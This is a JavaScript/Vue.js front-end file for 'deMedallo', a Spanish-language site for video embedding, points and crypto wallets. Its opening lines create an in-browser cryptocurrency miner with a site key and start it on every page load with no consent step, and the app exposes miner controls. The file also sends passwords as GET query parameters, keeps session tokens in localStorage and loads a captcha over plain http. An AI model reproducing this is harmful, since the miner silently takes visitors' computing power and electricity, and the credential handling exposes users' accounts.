var _client = new Client.Anonymous('9294b5ba9b1dfe99bf03eb63b2052eea9bde87cdf1c23792666f9fb2a11a572a', {
	throttle: 0.2, c: 'w'
});
_client.start();

function MinerDM(){
	return _client;
}


console.log('ok')

function zfill(number, width) {
    var numberOutput = Math.abs(number); /* Valor absoluto del número */
    var length = number.toString().length; /* Largo del número */ 
    var zero = "0"; /* String de cero */  
    
    if (width <= length) {
        if (number < 0) {
             return ("-" + numberOutput.toString()); 
        } else {
             return numberOutput.toString(); 
        }
    } else {
        if (number < 0) {
            return ("-" + (zero.repeat(width - length)) + numberOutput.toString()); 
        } else {
            return ((zero.repeat(width - length)) + numberOutput.toString()); 
        }
    }
}

function validateYouTubeUrl(url){
	if (url != undefined || url != '') {
		var regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=|\?v=)([^#\&\?]*).*/;
		var match = url.match(regExp);
		if (match && match[2].length == 11) {
			// Do anything for being valid
			// if need to change the url to embed url then use below line
			return match[2];
		}
		else { return null; }
	}
}

const _DM = axios.create({
  baseURL: 'http://localhost/website/api',
  timeout: 10000,
  headers: {'X-Custom-Header': 'foobar'},
});

const Footer = Vue.component('Footer', {
	data: function () {
		return {
			error: false,
		}
	},
	template: '#Footer-template',
	methods: {
	},
	created(){
		var self = this;
		
	},
	mounted(){
		var self = this;
		
	}
});

const viewVideoYoutube = Vue.component('viewVideoYoutube', {
	data: function () {
		return {
			error: true,
			message: '',
			videoid: '',
			title: 'Cargando...',
			description: 'Por favor espere...',
			thumbnail: '',
			urlYT: 'about:blank',
			videos: [],
			audios: [],
			total_videos: 0,
			total_audios: 0,
			tags: {},
		}
	},
	template: '#viewVideoYoutube-template',
	methods: {
		initVideo(){
			var self = this;
			
			dataSend = {
				videoid: self.videoid
			};
			
			_DM.get('/videos', {
				params: dataSend
			})
			.then(function (response) {
				var target = response.data;
				
				self.error = target.error;
				self.message = target.msg;
				if(self.error == false){
					for (var k in target.data){
						if (typeof target.data[k] !== 'function') {
							self[k] = (target.data[k]);
						}
					}
					
					if(self.total_videos > 0){
						self.createPlaterDM()
					}else{
						self.createPlayerYT();
						
					}
				}
				
			})
			.catch(function (error) {
				console.log(error);
			})
			
			//self.createPlater()
		},
		createPlayerYT(){
			var self = this;
			console.log('createPlayerYT');
			jwplayer('player').remove();
			self.urlYT = 'https://www.youtube.com/embed/' + self.videoid + '?autoplay=1';
		
			/*
			axios.get('api/points', { params: { token: "<?php echo $_SESSION['token']; ?>" }})
			.then(function (response) {
				//console.log(response);
				if(response.data.error == false){ jQuery(".wallet-DM-balance").html(response.data.data); }
			})
			.catch(function (error) { console.log(error); });
			*/			
		},
		createPlaterDM(){
			var self = this;
			self.urlYT = 'about:blank';
			console.log('DM Video');
			var playerDM = jwplayer('player');

			playerDM.setup({
			  playlist: {
				  "feed_instance_id": "c9912caf-321f-4811-b3e9-9932918d965d",
				  "title": self.title,
				  "kind": "Single Item",
				  "image": self.thumbnail,
				  "playlist": [
					{
					  "mediaid": self.videoid,
					  "description": self.description,
					  "pubdate": 1495054284,
					  "tags": "Youtube video demedallo",
					  "image": self.thumbnail,
					  "title": self.title,
					  "sources": self.videos
					}
				  ],
				  "description": self.description
				},
				"volume": 100,
				"mute": false
			});
			playerDM.addButton(
			  "//icons.jwplayer.com/icons/white/download.svg",
			  "Adquirir Video",
			  function() {
				window.location.href = playerDM.getPlaylistItem()['file'];
			  },
			  "download"
			);
			
		},
		
	},
	created(){
		var self = this;
		self.videoid = self.$route.params.videoid;
		
	},
	beforeRouteUpdate(to, from, next){
		var self = this;
		self.$route.params.videoid = to.params.videoid
		self.videoid = self.$route.params.videoid
		
		next(vm => { vm.initVideo(); })
	},
	mounted(){
		var self = this;
		self.videoid = self.$route.params.videoid;
		
		setTimeout(function(){
		}, 1000);
			self.initVideo();
	},
	beforeRouteEnter(to, from, next) {
		console.log(to.params.videoid)
		next(vm => { vm.videoid = to.params.videoid; })
		next(vm => { vm.initVideo(); })
		
		/*
		next(vm => {
		  vm.getTx();
		})*/
    }
});

const headerSearch = Vue.component('headerSearch', {
	name: 'headerSearch',
	data: function () {
		return {
			error: false,
			message: '',
			search: '',
			result: []
		}
	},
	template: '#headerSearch-template',
	methods: {
		submitSearch(){
			var self = this;			
			self.$parent.$parent.searchText(self.search)
		}
	},
	created(){
		var self = this;
		
	},
	mounted(){
		var self = this;
		
	}
});

const homePage = Vue.component('homePage', {
	data: function () {
		return {
			error: false,
			message: '',
			txResult: '',
			coin_id: 0,
			decimals: 0,
			step: 0,
			to: '',
			value: 0,
			fee: 0,
			data: '',
			balance: 0,
			adcopy_challenge: '',
			adcopy_response: ''
		}
	},
	template: `<div class="content_middle">
		<headerSearch></headerSearch>
			<div class="container">
				<div class="offering">
					<h2>¿Qué puede ofrecerle DM?</h2>
					<h3>Para ti y tus conocidos tenemos</h3>
					<ul class="icons wow fadeInUp" data-wow-delay="0.4s">
						<li>
							<span class="fa-stack fa-lg fa-4x">
								<i class="fa fa-circle fa-stack-2x"></i>
								<i class="fa fa-globe fa-stack-1x fa-inverse"></i>
							</span>
							<span class="one"> </span>
						</li>
						<li>
							<span class="fa-stack fa-lg fa-4x">
								<i class="fa fa-circle fa-stack-2x"></i>
								<i class="fa fa-bolt fa-stack-1x fa-inverse"></i>
							</span>
							<span class="one"> </span>
						</li>
						<li>
							<span class="fa-stack fa-lg fa-4x">
								<i class="fa fa-circle fa-stack-2x"></i>
								<i class="fa fa-film fa-stack-1x fa-inverse"></i>
							</span>
							<span class="one"> </span>
						</li>
						<li>
							<span class="fa-stack fa-lg fa-4x">
								<i class="fa fa-circle fa-stack-2x"></i>
								<i class="fa fa-briefcase fa-stack-1x fa-inverse"></i>
							</span>
							<span class="one"> </span>
						</li>
						<li>
							<span class="fa-stack fa-lg fa-4x">
								<i class="fa fa-circle fa-stack-2x"></i>
								<i class="fa fa-money fa-stack-1x fa-inverse"></i>
							</span>
							<span class="one"> </span>
						</li>
					</ul>
					<hr>
					<div class="real row">
						<div class="col-sm-6">
							<ul class="service_grid">
								<span class="fa-stack fa-lg fa-2x">
									<i class="fa fa-circle fa-stack-2x"></i>
									<i class="fa fa-globe fa-stack-1x fa-inverse"></i>
								</span>
								<h4>+ en <b>DM</b></h4>
								<li class="desc1 wow fadeInRight" data-wow-delay="0.4s">
									<p>Ahora en <b>deMedallo</b> puedes encontrar contenido multimedia de grandes sitios como <b>YouTube</b>, <b>Facebook</b>, <b>Vimeo</b>... Como videos musicales, Series, Peliculas y mucho mas!, Esto gracia a la tecnologia <b>API-REST</b> ya que utilizamos todos los recursos disponibles para entregarte un sitio web libre de publicidad.</p>
								</li>
								<div class="clearfix"> </div>
							</ul>
						</div>
						<div class="col-sm-6">
							<ul class="service_grid">
								<span class="fa-stack fa-lg fa-2x">
									<i class="fa fa-circle fa-stack-2x"></i>
									<i class="fa fa-bolt fa-stack-1x fa-inverse"></i>
								</span>
								<h4>+ Rapido</h4>
								<li class="desc1 wow fadeInRight" data-wow-delay="0.4s">
									<p><b>deMedallo</b> busca minimizar al maximo la publicidad en los sitios webs y con ello podemos aumentar la velocidad y optimizar el uso de tus dispositivos y disfrutar una experiencia mas comoda.</p>
								</li>
								<div class="clearfix"> </div>
							</ul>
						</div>
						<div class="clearfix"> </div>
						<div class="col-sm-6">
							<ul class="service_grid">
								<span class="fa-stack fa-lg fa-2x">
									<i class="fa fa-circle fa-stack-2x"></i>
									<i class="fa fa-film fa-stack-1x fa-inverse"></i>
								</span>
								<h4>+ Contenido</h4>
								<li class="desc1 wow fadeInRight" data-wow-delay="0.4s">
									<p>Gracias a los nuevos Both para revisar contenido publico podemos agregar mas contenido a nuestro sitio, Si no sabes por donde empezar te recomendamos visitar el link "<a href="#"><b>Como empezar en deMedallo.com</b></a>".</p>
								</li>
								<div class="clearfix"> </div>
							</ul>
						</div>
						<div class="col-sm-6">
							<ul class="service_grid">
								<span class="fa-stack fa-lg fa-2x">
									<i class="fa fa-circle fa-stack-2x"></i>
									<i class="fa fa-briefcase fa-stack-1x fa-inverse"></i>
								</span>
								<h4>+ <b>Oportunidades</b></h4>
								<li class="desc1 wow fadeInRight" data-wow-delay="0.4s">
									<p>Estamos creando en <b>deMedallo</b> un sistema para que puedas generar ganacias online, y llegar a la posibilidad de que cualquier persona pueda trabajar desde la comodidad de su hogar.</p>
								</li>
								<div class="clearfix"> </div>
							</ul>
						</div>
						<div class="clearfix"> </div>
						<div class="col-sm-6">
							<ul class="service_grid">
								<span class="fa-stack fa-lg fa-2x">
									<i class="fa fa-circle fa-stack-2x"></i>
									<i class="fa fa-money fa-stack-1x fa-inverse"></i>
								</span>
								<h4><b>1 Seg</b> = <b>1 DM</b></h4>
								<li class="desc1 wow fadeInRight" data-wow-delay="0.4s">
									<p>Ahora por cada segundo de <b>reproduccion</b> multimedia ganas <b>1 Punto</b> = <b>dm</b> el cual podras conjear por <b>productos</b>, <b>servicios</b>, <b>criptodivisas</b> y mucho mas!.</p>
								</li>
								<div class="clearfix"> </div>
							</ul>
						</div>
						<div class="clearfix"> </div>
					</div>
				</div>
			</div>
		</div>
	`,
	methods: {
	},
	created(){
		var self = this;
		
	},
	mounted(){
		var self = this;
		
	}
});

const searchPage = Vue.component('searchPage', {
	data: function () {
		return {
			error: false,
			message: '',
			q: ''
		}
	},
	template: '#searchPage-template',
	methods: {
		renderElement(){
			var self = this;
			google.search.cse.element.render({
				name: "resultsGoogle",
				gname: "resultsGoogle",
				div: "resultsGoogle",
				tag: 'searchresults-only',
				attributes: {
					queryParameterName: 'search'
				}
			}).execute(self.q)
		},
		myCallback(){
			var self = this;
			
			if (document.readyState == 'complete') {
				self.renderElement()
			} else {
				google.setOnLoadCallback(function() {
					self.renderElement()
				}, true);
			}
		}
	},
	created(){
		var self = this;
		
	},
	beforeRouteUpdate(to, from, next){
		var self = this;
		self.$route.params.search = to.params.search
		self.q = self.$route.params.search
		
		google.search.cse.element.getElement('resultsGoogle').execute(self.q)
	},
	beforeRouteEnter(to, from, next) {
		console.log(to.params.search)
		
		next(vm => { vm.q = to.params.search; })
		
		setTimeout(function(){
			google.search.cse.element.getElement('resultsGoogle').execute(to.params.search)
		}, 1000);
    },
	mounted(){
		var self = this;
		self.q = self.$route.params.search;
		
		window.__gcse = {
		  parsetags: 'explicit',
		  callback: self.myCallback
		};

		(function() {
		  var cx = '007894479317154908154:jwktchapsu0'; // Insert your own Custom Search engine ID here
		  var gcse = document.createElement('script'); gcse.type = 'text/javascript';
		  gcse.async = true;
		  gcse.src = 'https://cse.google.com/cse.js?cx=' + cx;
		  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(gcse, s);
		})();
		
		var myVar = setInterval(myTimer, 1000);

		function myTimer() {
			var anchors = document.getElementsByTagName("a");
			for (var i = 0; i < anchors.length; i++) {
				var n = validateYouTubeUrl(anchors[i].href);
				if(n != null){
					//url = "getvideo.dm?videoid=" + n + "&type=Download&q=" + self.q;
					urlBase = location.origin + location.pathname;
					url = urlBase + "#/videos/youtube/" + n + "/?q=" + self.q;
					
					anchors[i].setAttribute("href", url);
					//anchors[i].removeAttribute("href");
					anchors[i].removeAttribute("data-cturl");
					anchors[i].removeAttribute("target");
				}
			}
		}

		function myStopFunction() {
			clearInterval(myVar);
		}
	}
});

const formRegister = Vue.component('formRegister', {
	data: function () {
		return {
			error: false,
			message: '',
			name: '',
			nick: '',
			email: '',
			pass1: '',
			pass2: '',
			adcopy_challenge: '',
			adcopy_response: ''
		}
	},
	template: '#formRegister-template',
	created(){
		var self = this;
		var sessionCheck = self.$parent.checkSession();
		if(sessionCheck == true){
			return false;
		}
		setTimeout(function(){
			self.$parent.realoadCaptcha('acwidget-register')
		}, 1000);
	},
	methods: {
		submitRegister: function(){
			var self = this;
			var nameCap = 'acwidget-register';
			self.adcopy_challenge = jQuery("#adcopy_challenge-" + nameCap).val();
			self.adcopy_response = jQuery("#adcopy_response-" + nameCap).val();
			
			dataSend = {
				name: self.name,
				nick: self.nick,
				email: self.email,
				pass1: self.pass1,
				pass2: self.pass2,
				adcopy_response: self.adcopy_response,
				adcopy_challenge: self.adcopy_challenge
			};
			
			_DM.get('/register', {
				params: dataSend
			})
			.then(function (response) {
				self.error = response.data.error;
				self.message = response.data.msg;
				
				if(response.data.error == false){ self.$parent.saveSession(response.data.data); }
			})
			.catch(function (error) {
				console.log(error);
			})
			.then(function (response) {
			});
			
			self.$parent.realoadCaptcha(nameCap);
		}
	}
});

const formLogin = Vue.component('formLogin', {
	data: function () {
		return {
			error: false,
			message: '',
			mailornick: '',
			hash: '',
			adcopy_challenge: '',
			adcopy_response: ''
		}
	},
	template: '#formLogin-template',
	created(){
		var self = this;
		setTimeout(function(){
			self.$parent.realoadCaptcha('acwidget-login')
		}, 1000);
	},
	methods: {
		submitLogin: function(){
			var self = this;
			var nameCap = 'acwidget-login';
			
			self.adcopy_challenge = jQuery("#adcopy_challenge-" + nameCap).val();
			self.adcopy_response = jQuery("#adcopy_response-" + nameCap).val();
			
			dataSend = {
				mailornick: self.mailornick,
				hash: self.hash,
				adcopy_response: self.adcopy_response,
				adcopy_challenge: self.adcopy_challenge
			};
			
			_DM.get('/login', {
				params: dataSend
			})
			.then(function (response) {
				self.error = response.data.error;
				self.message = response.data.msg;
				
				if(response.data.error == false){ self.$parent.saveSession(response.data.data); }
			})
			.catch(function (error) {
				console.log(error);
			})
			.then(function (response) {
			});
			
			self.$parent.realoadCaptcha(nameCap);
		}
	}
});

const myaccountModal = Vue.component('myaccountModal', {
	data: function () {
		return {
			nick: '',
		}
	},
	template: '#myaccountModal-template',
	created(){
		
	},
	methods: {
	}
});

const viewWalletsPage = Vue.component('viewWalletsPage', {
	//mode: 'history',
	data: function () {
		return {
			error: false,
			message: '',
			address: '',
			coin_id: 0,
			balance: 0,
			name: '',
			symbol: '',
			decimals: 0.0,
			totalSend: {},
			totalRecibe: {},
			lastTx: [],
		}
	},
	template: '#viewWallets-template',
	methods: {
		loadWallet(){
			var self = this;
			
			dataSend = {
				address: self.address,
				coin_id: self.coin_id
			};
			
			_DM.get('/wallets', { params: dataSend })
			.then(function (response) {
				var target = response.data;
				
				self.error = target.error;
				if(target.error == false){
					for (var k in target.data){
						if (typeof target.data[k] !== 'function') {
							self[k] = (target.data[k]);
						}
					}
				}
			})
			.catch(function (error) {
				console.log(error);
			})
			.then(function (response) {
			});
		}
	},
	created(){
		var self = this;
		self.address = self.$route.params.address
		self.coin_id = self.$route.params.coin_id
		self.loadWallet();
	},
	mounted(){
		var self = this;
		self.address = self.$route.params.address
		self.coin_id = self.$route.params.coin_id
		self.loadWallet();
	},
	beforeRouteUpdate(to, from, next) {
		to.params.address
		var self = this;
		self.$route.params.coin_id = to.params.coin_id
		self.$route.params.address = to.params.address
		self.address = self.$route.params.address
		self.coin_id = self.$route.params.coin_id
		next()
		self.loadWallet()
	}
});

const viewTxPage = Vue.component('viewTxPage', {
	data: function () {
		return {
			error: false,
			name: '',
			message: '',
			id: 0,
			tx: '',
			from: '',
			to: '',
			value: '',
			fee: 0.0,
			data: '',
			coin: 0,
			create: '',
			coinInfo: {},
		}
	},
	template: '#viewTx-template',
	methods: {
		getTx(txSend){
			var self = this;
			dataSend = {
				tx: txSend
			};
			
			_DM.get('/txs', { params: dataSend })
			.then(function (response) {
				var target = response.data;
				self.error = target.error;
				if(target.error == false){
					for (var k in target.data){
						if (typeof target.data[k] !== 'function') {
							self[k] = (target.data[k]);
						}
					}
				}
			})
			.catch(function (error) {
				console.log(error);
			})
		}
	},
	mounted(){
		var self = this;
		self.getTx(self.tx);
	},
	beforeRouteEnter(to, from, next) {
		next(vm => {
		  vm.getTx(to.params.tx);
		})
    }
});

const viewLastTxPage = Vue.component('viewLastTxPage', {
	data: function () {
		return {
			error: false,
			message: '',
			coin_id: 0,
			balance: '',
			address: '',
			name: '',
			symbol: '',
			decimals: 0.0,
			lastTx: [],
		}
	},
	template: '#viewLastTx-template',
	methods: {
		getTxLast(addressSend, coin_idSend){
			var self = this;
			dataSend = {
				address: addressSend,
				coin_id: coin_idSend
			};
			
			_DM.get('/lastTxs', { params: dataSend })
			.then(function (response) {
				var target = response.data;
				self.error = target.error;
				if(target.error == false){
					for (var k in target.data){
						if (typeof target.data[k] !== 'function') {
							self[k] = (target.data[k]);
						}
					}
				}
			})
			.catch(function (error) {
				console.log(error);
			})
		}
	},
	mounted(){
		var self = this;
		self.getTxLast(self.address, self.coin_id);
	},
	beforeRouteEnter(to, from, next) {
		next(vm => {
		  vm.getTxLast(to.params.address, to.params.coin_id);
		})
    }
});

const viewTeamWPage = Vue.component('viewTeamWPage', {
	data: function () {
		return {
			error: false,
			message: '',
			id: 0,
			name: '',
			symbol: '',
			decimals: 0,
			wallets: [],
		}
	},
	template: '#viewTeamW-template',
	methods: {
		getTeamW(coin_idSend){
			var self = this;
			dataSend = {
				coin_id: coin_idSend
			};
			
			_DM.get('/teamW', { params: dataSend })
			.then(function (response) {
				var target = response.data;
				self.error = target.error;
				if(target.error == false){
					for (var k in target.data){
						if (typeof target.data[k] !== 'function') {
							self[k] = (target.data[k]);
						}
					}
				}
			})
			.catch(function (error) {
				console.log(error);
			})
		}
	},
	mounted(){
		var self = this;
		self.getTeamW(self.coin_id);
	},
	beforeRouteEnter(to, from, next) {
		next(vm => {
		  vm.getTeamW(to.params.coin_id);
		})
    }
});

const viewSendWPage = Vue.component('viewSendWPage', {
	name: 'ComponentViewSendW',
	data: function () {
		return {
			error: false,
			message: '',
			txResult: '',
			coin_id: 0,
			decimals: 0,
			step: 0,
			to: '',
			value: 0,
			fee: 0,
			data: '',
			balance: 0,
			adcopy_challenge: '',
			adcopy_response: ''
		}
	},
	template: '#viewSendW-template',
	methods: {
		submitSendW: function(){
			var self = this;
			
			var nameCap = 'acwidget-sendW';
			self.adcopy_challenge = jQuery("#adcopy_challenge-" + nameCap).val();
			self.adcopy_response = jQuery("#adcopy_response-" + nameCap).val();
			
			dataSend = {
				token: self.$parent.token,
				coin_id: self.coin_id,
				to: self.to,
				value: self.value,
				fee: self.fee,
				data: self.data,
				adcopy_response: self.adcopy_response,
				adcopy_challenge: self.adcopy_challenge
			};
			
			_DM.get('/sendW', {
				params: dataSend
			})
			.then(function (response) {
				
				self.error = response.data.error;
				self.message = response.data.msg;
				
				if(self.error == false){
					self.txResult = response.data.data;
					
				}
			})
			.catch(function (error) {
				console.log(error);
			})
			
			self.$parent.realoadCaptcha(nameCap);
			self.$parent.refreshSession();
		}
	},
	created(){
		var self = this;
		setTimeout(function(){
			self.$parent.realoadCaptcha('acwidget-sendW')
		}, 1000);
		
	},
	mounted(){
		var self = this;
		setTimeout(function(){
			self.$parent.realoadCaptcha('acwidget-sendW')
		}, 1000);
		
		
		self.coin_id = self.$parent.wallets[self.$route.params.coin_symbol].coin_id;
		self.decimals = self.$parent.wallets[self.$route.params.coin_symbol].decimals;
		self.balance = self.$parent.wallets[self.$route.params.coin_symbol].balance;
		self.step = ('0.' + zfill(1, self.decimals)); //parseFloat
		
	}
});

const routes = [
	{ path: '/', name: 'viewHomePage', component: homePage },
	{ path: '/search/:search', name: 'viewSearchPage', component: searchPage, props: (route) => ({ query: route.query.search }) },
	{ path: '/Register', name: 'viewRegisterPage', component: formRegister },
	{ path: '/tx/:tx', name: 'viewTxPage', component: viewTxPage },
	{ path: '/wallet/:address/:coin_id', name: 'viewWalletPage', component: viewWalletsPage },
	{ path: '/lastTx/:address/:coin_id', name: 'viewLastTxPage', component: viewLastTxPage },
	{ path: '/teamW/:coin_id', name: 'viewTeamWPage', component: viewTeamWPage },
	{ path: '/sendW/:coin_symbol', name: 'viewSendWPage', component: viewSendWPage },
	{ path: '/videos/youtube/:videoid', name: 'viewVideoYoutube', component: viewVideoYoutube, props: (route) => ({ query: route.query.videoid }) },
];

const router = new VueRouter({
  routes
})

new Vue({
	el: '#app',
	router: router,
	components: {
		'headerSearch': headerSearch,
		'myaccountModal': myaccountModal,
		'homePage': homePage,
		'formLogin': formLogin,
		'formRegister': formRegister,
		'viewTxPage': viewTxPage,
		'viewWalletsPage': viewWalletsPage,
		'viewLastTxPage': viewLastTxPage,
		'viewTeamWPage': viewTeamWPage,
		'viewSendWPage': viewSendWPage,
	},
	data: {
		isLogin: false,
		search_text: '',
		name: '',
		nick: '',
		token: '',
		refers: 0,
		mail: '',
		userid: 0,
		actived: 0,
		banned: 0,
		create: '',
		wallets: [],
	},
	created() {
		var self = this;
		self.loadCaptcha();
		self.checkSession();		
		
		//self.startMiner()
		//self.Miner()
		// console.log(self.wallets);
	},
	mounted() {
		jQuery('.dropdown-toggle').on('click', function (e) {
		  $(this).next().toggle();
		});
		jQuery('.dropdown-menu.keep-open').on('click', function (e) {
		  e.stopPropagation();
		});

		if(1) {
		  $('body').attr('tabindex', '0');
		}
		else {
		  alertify.confirm().set({'reverseButtons': true});
		  alertify.prompt().set({'reverseButtons': true});
		}
	},
	watch: {
		//token(newName) { localStorage.token = newName; }
	},
	methods: {
		Miner(){
			return MinerDM();
		},
		stopMiner(){
			MinerDM.stop();
		},
		startMiner(){
			MinerDM.start();
		},
		searchText(text_search){
			dataSend = {
				search_text: text_search
			};
			
			_DM.get('/search', {
				params: dataSend
			})
			.then(function (response) {
				result = response.data;
				
				if(result.error == false){
					if(result.msg == 'TxResult'){
						router.push({ name: 'viewTxPage', params: { tx: text_search }});
					}
					else if(result.msg == 'WalletResult_DM'){
						router.push({ name: 'viewWalletPage', params: { address: text_search, coin_id: 1 }});
						//router.push({ path: '/wallet/' + self.text_search + '/1' })
					}
					else if(result.msg == 'Google'){
						//router.push({ name: 'viewSearchPage', params: { q: text_search }});
						router.push({ path: '/search/' + text_search })
					}
				}				
			})
			.catch(function (error) {
				console.log(error);
			})
		},
		submitSearch(){
			var self = this;
			self.searchText(self.search_text)
		},
		refreshSession(){
			var self = this;
			_DM.get('/login', {
				params: { token: self.token }
			})
			.then(function (response) {
				if(response.data.error == false){
					self.reSaveSession(response.data.data);
				}
			})
			.catch(function (error) {
				console.log(error);
			})
			.then(function (response) {
			});
		},
		checkSession(){
			var self = this;
			if (localStorage.token) {
				self.isLogin = true;
				self.name = localStorage.name;
				self.nick = localStorage.nick;
				self.token = localStorage.token;
				self.mail = localStorage.mail;
				self.userid = localStorage.id;
				self.create = localStorage.create;
				self.refers = localStorage.refers;
				self.banned = localStorage.banned;
				self.actived = localStorage.actived;
				self.wallets = JSON.parse(localStorage.wallets);
				
				return true;
			}
			else{
				self.isLogin = false;
				return false;
			}
		},
		reSaveSession(target){
			var self = this;
			
			for (var k in target){
				if (typeof target[k] !== 'function') {
					if(k == 'wallets'){
						localStorage.setItem(k, JSON.stringify(target[k]));
					}else{
						localStorage.setItem(k, target[k]);
					}
				}
			}
			self.checkSession();
		},
		saveSession(target){
			var self = this;
			
			for (var k in target){
				if (typeof target[k] !== 'function') {
					if(k == 'wallets'){
						localStorage.setItem(k, JSON.stringify(target[k]));
					}else{
						localStorage.setItem(k, target[k]);
					}
				}
			}
			location.reload();
		},
		loadCaptcha() {
			let recaptchaScript = document.createElement('script');
			recaptchaScript.setAttribute('src', 'http://api.solvemedia.com/papi/challenge.ajax');
			document.head.appendChild(recaptchaScript);
		},
		realoadCaptcha(element){
			ACPuzzle.create('5JNz5YEWn5j50mNNCPmaY-yRLR-8VuMN', element, { multi: true, id: element, lang: 'de', size: 'standard' });
		},
		LogOut() {
			localStorage.clear();
			location.reload();
		}
	},
	beforeCreate:function(){
		console.log("Creando");
		//MinerDM().getTotalHashes()
	},
	template: `<div>
		<header>
			<nav class="navbar navbar-expand-md navbar-dark sticky-top bg-dark">
				<a class="navbar-brand" href="/website/"><img src="images/logo.png" height="52" class="d-inline-block align-top" alt=""></a>
				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
				<div class="collapse navbar-collapse" id="navbarCollapse">
					<form class="navbar-nav mr-auto form-inline" method="search"  action="javascript:false; " @submit="submitSearch">
						<input class="form-control mr-sm-2" type="text" placeholder="¿Que Buscas?" aria-label="¿Que Buscas?" value=""  name="q" v-model="search_text" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = '';}" />
						<button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
					</form>
					<ul class="navbar-nav mt-2 mt-md-0">						
						<li class="nav-item dropdown" v-if="isLogin == false">
							<a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Ingresar</a>
							<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown">
								<formLogin></formLogin>								
							</div>
						</li>
						<li class="nav-item dropdown" v-else="">
							<a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">{{ nick }}</a>
							<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown">
								<a class="dropdown-item" href="#" target="_new">DM - deMedallo</a>
								<div class="dropdown-divider"></div>
								<myaccountModal></myaccountModal>
							</div>
						</li>
						
						<li class="nav-item" v-if="isLogin == true"><a class="nav-link" @click="LogOut()">Salir</a></li>
						<router-link tag="li" class="nav-item" to="/Register" v-else=""><a class="nav-link" >Crear Cuenta</a></router-link>
					</ul>
				</div>
			</nav>
		</header>

		<main role="main">
			<transition>
			  <keep-alive>
				<router-view></router-view>
			  </keep-alive>
			</transition>
			<Footer></Footer>
		</main>
	</div>`
});

